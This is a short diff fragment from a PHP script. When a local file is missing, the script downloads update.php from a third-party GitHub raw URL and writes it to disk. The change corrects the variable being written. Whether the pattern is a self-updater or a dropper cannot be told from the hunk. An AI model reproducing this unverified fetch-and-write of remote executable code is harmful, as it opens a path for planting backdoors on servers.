@@ -153,7 +153,7 @@ if(!is_file('./'. $update)){
 
     $php = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
     $myfile = fopen('./'. $update, "w") or die("Unable to open $update!");
-    fwrite($myfile, $js);
+    fwrite($myfile, $php);
     fclose($myfile);
     
     }
